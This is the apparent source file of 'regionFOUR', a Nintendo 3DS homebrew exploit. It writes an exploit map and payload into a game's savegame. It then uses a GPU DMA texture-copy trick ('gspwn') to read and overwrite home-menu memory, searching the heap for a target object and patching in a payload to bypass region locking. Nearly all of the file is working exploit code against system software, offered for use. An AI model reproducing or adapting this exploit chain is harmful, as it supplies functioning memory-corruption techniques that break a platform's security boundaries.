#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <ctr/types.h>
#include <ctr/srv.h>
#include <ctr/svc.h>
#include <ctr/APT.h>
#include <ctr/FS.h>
#include "text.h"
#include "menu_payload_bin.h"
#include "cn_save_initial_loader_bin.h"

#include "../../build/constants.h"

#define TOPFBADR1 ((u8*)CN_TOPFBADR1)
#define TOPFBADR2 ((u8*)CN_TOPFBADR2)

typedef enum
{
	PAD_A = (1<<0),
	PAD_B = (1<<1),
	PAD_SELECT = (1<<2),
	PAD_START = (1<<3),
	PAD_RIGHT = (1<<4),
	PAD_LEFT = (1<<5),
	PAD_UP = (1<<6),
	PAD_DOWN = (1<<7),
	PAD_R = (1<<8),
	PAD_L = (1<<9),
	PAD_X = (1<<10),
	PAD_Y = (1<<11)
}PAD_KEY;

int _strlen(char* str)
{
	int l=0;
	while(*(str++))l++;
	return l;
}

void _strcpy(char* dst, char* src)
{
	while(*src)*(dst++)=*(src++);
	*dst=0x00;
}

void _strappend(char* str1, char* str2)
{
	_strcpy(&str1[_strlen(str1)], str2);
}

Result _srv_RegisterClient(Handle* handleptr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x10002; //request header code
	cmdbuf[1]=0x20;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	return cmdbuf[1];
}

Result _initSrv(Handle* srvHandle)
{
	Result ret=0;
	if(svc_connectToPort(srvHandle, "srv:"))return ret;
	return _srv_RegisterClient(srvHandle);
}

Result _srv_getServiceHandle(Handle* handleptr, Handle* out, char* server)
{
	u8 l=_strlen(server);
	if(!out || !server || l>8)return -1;

	u32* cmdbuf=getThreadCommandBuffer();

	cmdbuf[0]=0x50100; //request header code
	_strcpy((char*)&cmdbuf[1], server);
	cmdbuf[3]=l;
	cmdbuf[4]=0x0;

	Result ret=0;
	if((ret=svc_sendSyncRequest(*handleptr)))return ret;

	*out=cmdbuf[3];

	return cmdbuf[1];
}

const u8 hexTable[]=
{
	'0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f'
};

void hex2str(char* out, u32 val)
{
	int i;
	for(i=0;i<8;i++){out[7-i]=hexTable[val&0xf];val>>=4;}
	out[8]=0x00;
}

void renderString(char* str, int x, int y)
{
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;
	drawString(TOPFBADR1,str,x,y);
	drawString(TOPFBADR2,str,x,y);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR1, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR2, 240*400*3);
}

void centerString(char* str, int y)
{
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;
	int x=200-(_strlen(str)*4);
	drawString(TOPFBADR1,str,x,y);
	drawString(TOPFBADR2,str,x,y);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR1, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR2, 240*400*3);
}

void drawHex(u32 val, int x, int y)
{
	char str[9];

	hex2str(str,val);
	renderString(str,x,y);
}

Result _APT_PrepareToStartSystemApplet(Handle handle, NS_APPID appId)
{
	u32* cmdbuf=getThreadCommandBuffer();
	
	cmdbuf[0]=0x00190040; //request header code
	cmdbuf[1]=appId;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
	
	return cmdbuf[1];
}

Result _APT_StartSystemApplet(Handle handle, NS_APPID appId, u32* buffer, u32 bufferSize, Handle arg)
{
	u32* cmdbuf=getThreadCommandBuffer();
	
	cmdbuf[0]=0x001F0084; //request header code
	cmdbuf[1]=appId;
	cmdbuf[2]=bufferSize;
	cmdbuf[3]=0x0;
	cmdbuf[4]=arg;
	cmdbuf[5]=(bufferSize<<14)|0x2;
	cmdbuf[6]=(u32)buffer;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
	
	return cmdbuf[1];
}

Result _GSPGPU_AcquireRight(Handle handle, u8 flags)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x160042; //request header code
	cmdbuf[1]=flags;
	cmdbuf[2]=0x0;
	cmdbuf[3]=0xffff8001;

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _GSPGPU_ReleaseRight(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x170000; //request header code

	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

#define _aptOpenSession() \
	svc_waitSynchronization1(aptLockHandle, U64_MAX);\
	_srv_getServiceHandle(srvHandle, &aptuHandle, "APT:U");\

#define _aptCloseSession()\
	svc_closeHandle(aptuHandle);\
	svc_releaseMutex(aptLockHandle);\

void doGspwn(u32* src, u32* dst, u32 size)
{
	Result (*nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue)(u32** sharedGspCmdBuf, u32* cmdAdr)=(void*)CN_nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue;
	u32 gxCommand[]=
	{
		0x00000004, //command header (SetTextureCopy)
		(u32)src, //source address
		(u32)dst, //destination address
		size, //size
		0xFFFFFFFF, // dim in
		0xFFFFFFFF, // dim out
		0x00000008, // flags
		0x00000000, //unused
	};

	u32** sharedGspCmdBuf=(u32**)(CN_GSPSHAREDBUF_ADR);
	nn__gxlow__CTR__CmdReqQueueTx__TryEnqueue(sharedGspCmdBuf, gxCommand);
}

Result _APT_ReceiveParameter(Handle handle, NS_APPID appID, u32 bufferSize, u32* buffer, u32* actualSize, u8* signalType, Handle* outHandle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0xD0080; //request header code
	cmdbuf[1]=appID;
	cmdbuf[2]=bufferSize;
	
	cmdbuf[0+0x100/4]=(bufferSize<<14)|2;
	cmdbuf[1+0x100/4]=(u32)buffer;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	if(!cmdbuf[1])
	{
		if(signalType)*signalType=cmdbuf[3];
		if(actualSize)*actualSize=cmdbuf[4];
		if(outHandle)*outHandle=cmdbuf[6];
	}

	return cmdbuf[1];
}

Result _APT_CancelParameter(Handle handle, NS_APPID appID)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0xF0100; //request header code
	cmdbuf[1]=0x0;
	cmdbuf[2]=0x0;
	cmdbuf[3]=0x0;
	cmdbuf[4]=appID;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_FlushInvalidateCache(Handle handle)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00010042; //request header code
	cmdbuf[1]=0x00100000;
	cmdbuf[2]=0x00000000;
	cmdbuf[3]=0xFFFF8001;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_SetupBootloader(Handle handle, u32 addr)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00020042; //request header code
	cmdbuf[1]=addr;
	cmdbuf[2]=0x00000000;
	cmdbuf[3]=0xFFFF8001;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	return cmdbuf[1];
}

Result _HB_GetHandle(Handle handle, u32 index, Handle* out)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x00040040; //request header code
	cmdbuf[1]=index;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;

	if(out)*out=cmdbuf[5];

	return cmdbuf[1];
}

void bruteforceCloseHandle(u16 index, u32 maxCnt)
{
	int i;
	for(i=0;i<maxCnt;i++)if(!svc_closeHandle((index)|(i<<15)))return;
}

//no idea what this does; apparently used to switch up save partitions
Result FSUSER_ControlArchive(Handle handle, FS_archive archive)
{
	u32* cmdbuf=getThreadCommandBuffer();

	u32 b1, b2;
	((u8*)&b1)[0]=0x4e;
	((u8*)&b2)[0]=0xe4;

	cmdbuf[0]=0x080d0144;
	cmdbuf[1]=archive.handleLow;
	cmdbuf[2]=archive.handleHigh;
	cmdbuf[3]=0x0;
	cmdbuf[4]=0x1; //buffer1 size
	cmdbuf[5]=0x1; //buffer1 size
	cmdbuf[6]=0x1a;
	cmdbuf[7]=(u32)&b1;
	cmdbuf[8]=0x1c;
	cmdbuf[9]=(u32)&b2;
 
	Result ret=0;
	if((ret=svc_sendSyncRequest(handle)))return ret;
 
	return cmdbuf[1];
}

void clearScreen(u8 shade)
{
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;
	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u8* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;
	memset(TOPFBADR1, shade, 240*400*3);
	memset(TOPFBADR2, shade, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR1, 240*400*3);
	_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, TOPFBADR2, 240*400*3);
}

void errorScreen(char* str, u32* dv, u8 n)
{
	clearScreen(0x00);
	renderString("FATAL ERROR",0,0);
	renderString(str,0,10);
	if(dv && n)
	{
		int i;
		for(i=0;i<n;i++)drawHex(dv[i], 8, 50+i*10);
	}
	while(1);
}

void drawTitleScreen(char* str)
{
	clearScreen(0x00);
	centerString("regionFOUR v1.0",0);
	centerString(BUILDTIME,10);
	centerString("http://smealum.net/regionfour/",20);
	renderString(str, 0, 40);
}

void installerScreen(u32 size)
{
	char str[512] =
		"install the exploit to your savegame ?\n"
		"this will overwrite your custom levels\n"
		"and make some of the game inoperable.\n"
		"the exploit can later be uninstalled.\n"
		"    A : Yes \n"
		"    B : No  ";
	drawTitleScreen(str);

	while(1)
	{
		u32 PAD=((u32*)0x10000000)[7];
		drawHex(PAD,100,100);
		if(PAD&PAD_A)
		{
			//install
			int state=0;
			Result ret;
			Handle fsuHandle=*(Handle*)CN_FSHANDLE_ADR;
			FS_archive saveArchive=(FS_archive){0x00000004, (FS_path){PATH_EMPTY, 1, (u8*)""}};
			u32 totalWritten;
			Handle fileHandle;

			_strappend(str, "\n\n   installing..."); drawTitleScreen(str);

			ret=FSUSER_OpenArchive(fsuHandle, &saveArchive);
			state++; if(ret)goto installEnd;

			//write exploit map file
			ret=FSUSER_OpenFile(fsuHandle, &fileHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/mslot0.map"), FS_OPEN_WRITE|FS_OPEN_CREATE, FS_ATTRIBUTE_NONE);
			state++; if(ret)goto installEnd;
			ret=FSFILE_Write(fileHandle, &totalWritten, 0x0, (u32*)cn_save_initial_loader_bin, cn_save_initial_loader_bin_size, 0x10001);
			state++; if(ret)goto installEnd;
			ret=FSFILE_Close(fileHandle);
			state++; if(ret)goto installEnd;

			//write secondary payload file
			ret=FSUSER_OpenFile(fsuHandle, &fileHandle, saveArchive, FS_makePath(PATH_CHAR, "/edit/payload.bin"), FS_OPEN_WRITE|FS_OPEN_CREATE, FS_ATTRIBUTE_NONE);
			state++; if(ret)goto installEnd;
			ret=FSFILE_Write(fileHandle, &totalWritten, 0x0, (u32*)0x14300000, size, 0x10001);
			state++; if(ret)goto installEnd;
			ret=FSFILE_Close(fileHandle);
			state++; if(ret)goto installEnd;

			ret=FSUSER_ControlArchive(fsuHandle, saveArchive);
			state++; if(ret)goto installEnd;

			ret=FSUSER_CloseArchive(fsuHandle, &saveArchive);
			state++; if(ret)goto installEnd;

			installEnd:
			if(ret)
			{
				u32 v[2]={ret, state};
				errorScreen("   installation process failed.\n   please report the below information by\n   email to sme@lum.sexy", v, 2);
			}

			_strappend(str, " done.\n\n   press A to run the exploit."); drawTitleScreen(str);
			u32 oldPAD=((u32*)0x10000000)[7];
			while(1)
			{
				u32 PAD=((u32*)0x10000000)[7];
				if(((PAD^oldPAD)&PAD_A) && (PAD&PAD_A))break;
				drawHex(PAD,200,200);
				oldPAD=PAD;
			}

			break;
		}else if(PAD&PAD_B)break;
	}
}

Result _APT_AppletUtility(Handle* handle, u32* out, u32 a, u32 size1, u8* buf1, u32 size2, u8* buf2)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x4B00C2; //request header code
	cmdbuf[1]=a;
	cmdbuf[2]=size1;
	cmdbuf[3]=size2;
	cmdbuf[4]=(size1<<14)|0x402;
	cmdbuf[5]=(u32)buf1;
	
	cmdbuf[0+0x100/4]=(size2<<14)|2;
	cmdbuf[1+0x100/4]=(u32)buf2;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	if(out)*out=cmdbuf[2];

	return cmdbuf[1];
}

Result _APT_PrepareToCloseApplication(Handle* handle, u8 a)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x220040; //request header code
	cmdbuf[1]=a;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

Result _APT_CloseApplication(Handle* handle, u32 a, u32 b, u32 c)
{
	u32* cmdbuf=getThreadCommandBuffer();
	cmdbuf[0]=0x270044; //request header code
	cmdbuf[1]=a;
	cmdbuf[2]=0x0;
	cmdbuf[3]=b;
	cmdbuf[4]=(a<<14)|2;
	cmdbuf[5]=c;
	
	Result ret=0;
	if((ret=svc_sendSyncRequest(*handle)))return ret;

	return cmdbuf[1];
}

void _aptExit()
{
	Handle* srvHandle=(Handle*)CN_SRVHANDLE_ADR;
	Handle aptLockHandle=*((Handle*)CN_APTLOCKHANDLE_ADR);
	Handle aptuHandle=0x00;

	u8 buf1[4], buf2[4];

	buf1[0]=0x02; buf1[1]=0x00; buf1[2]=0x00; buf1[3]=0x00;
	_aptOpenSession();
	_APT_AppletUtility(&aptuHandle, NULL, 0x7, 0x4, buf1, 0x1, buf2);
	_aptCloseSession();
	_aptOpenSession();
	_APT_AppletUtility(&aptuHandle, NULL, 0x4, 0x1, buf1, 0x1, buf2);
	_aptCloseSession();

	_aptOpenSession();
	_APT_AppletUtility(&aptuHandle, NULL, 0x7, 0x4, buf1, 0x1, buf2);
	_aptCloseSession();
	_aptOpenSession();
	_APT_AppletUtility(&aptuHandle, NULL, 0x4, 0x1, buf1, 0x1, buf2);
	_aptCloseSession();
	_aptOpenSession();
	_APT_AppletUtility(&aptuHandle, NULL, 0x4, 0x1, buf1, 0x1, buf2);
	_aptCloseSession();


	_aptOpenSession();
	_APT_PrepareToCloseApplication(&aptuHandle, 0x1);
	_aptCloseSession();
	
	_aptOpenSession();
	_APT_CloseApplication(&aptuHandle, 0x0, 0x0, 0x0);
	_aptCloseSession();
}

void inject_payload(u32 target_address)
{
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;

	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;

	u32 target_base = target_address & ~0xFF;
	u32 target_offset = target_address - target_base;

	//read menu memory
	{
		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x00001000);
		
		doGspwn((u32*)(target_base), (u32*)0x14100000, 0x00001000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be read

	//patch memdump and write it
	{
		u32* payload_src = (u32*)menu_payload_bin;
		u32* payload_dst = &((u32*)0x14100000)[target_offset/4];

		//patch in payload
		int i;
		for(i=0; i<menu_payload_bin_size/4; i++)
		{
			if(payload_src[i] < 0xBABE0000+0x100 && payload_src[i] > 0xBABE0000-0x100)
			{
				payload_dst[i] = payload_src[i] + target_address - 0xBABE0000;
			}else if(payload_src[i] != 0xDEADCAFE) payload_dst[i] = payload_src[i];
		}

		_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, 0x00001000);

		doGspwn((u32*)0x14100000, (u32*)(target_base), 0x00001000);
	}

	svc_sleepThread(10000000); //sleep long enough for memory to be written
}

int main(u32 size, char** argv)
{
	int line=10;
	drawTitleScreen("");

	Handle* srvHandle=(Handle*)CN_SRVHANDLE_ADR;
	Handle* gspHandle=(Handle*)CN_GSPHANDLE_ADR;

	Handle aptLockHandle=*((Handle*)CN_APTLOCKHANDLE_ADR);
	Handle aptuHandle=0x00;
	Result ret;

	u8 recvbuf[0x1000];

	Result (*_GSPGPU_FlushDataCache)(Handle* handle, Handle kprocess, u32* addr, u32 size)=(void*)CN_GSPGPU_FlushDataCache_ADR;

	if(size)installerScreen(size);

	// regionfour stuff
	drawTitleScreen("searching for target...");

	//search for target object in home menu's linear heap
	const u32 start_addr = FIRM_LINEARSYSTEM;
	const u32 end_addr = FIRM_LINEARSYSTEM + 0x01000000;
	const block_size = 0x00010000;
	const block_stride = block_size-0x100; // keep some overlap to make sure we don't miss anything

	int cnt = 0;
	u32 block_start;
	u32 target_address = start_addr;
	for(block_start=start_addr; block_start<end_addr; block_start+=block_stride)
	{
		//read menu memory
		{
			_GSPGPU_FlushDataCache(gspHandle, 0xFFFF8001, (u32*)0x14100000, block_size);
			
			doGspwn((u32*)(block_start), (u32*)0x14100000, block_size);
		}

		svc_sleepThread(1000000); //sleep long enough for memory to be read

		int i;
		u32 end = block_size/4-0x10;
		for(i=0; i<end; i++)
		{
			const u32* adr = &((u32*)0x14100000)[i];
			if(adr[2]==0x5544 && adr[3]==0x80 && adr[6]!=0x0 && adr[0x1F]==0x6E4C5F4E)break;
		}
		if(i<end)
		{
			drawTitleScreen("searching for target...\n    target locked ! engaging.");

			target_address = block_start + i * 4;

			drawHex(target_address, 8, 50+cnt*10);
			drawHex(((u32*)0x14100000)[i+6], 100, 50+cnt*10);
			drawHex(((u32*)0x14100000)[i+0x1f], 200, 50+cnt*10);

			inject_payload(target_address+0x18);

			block_start = target_address + 0x10 - block_stride;
			cnt++;
			break;
		}
	}

	svc_sleepThread(100000000); //sleep long enough for memory to be written

	drawTitleScreen("\n   regionFOUR is ready.\n   insert your gamecard and press START.");

	_GSPGPU_ReleaseRight(*gspHandle); //disable GSP module access

	//exit to menu
	_aptExit();
	svc_exitProcess();

	while(1);
	return 0;
}
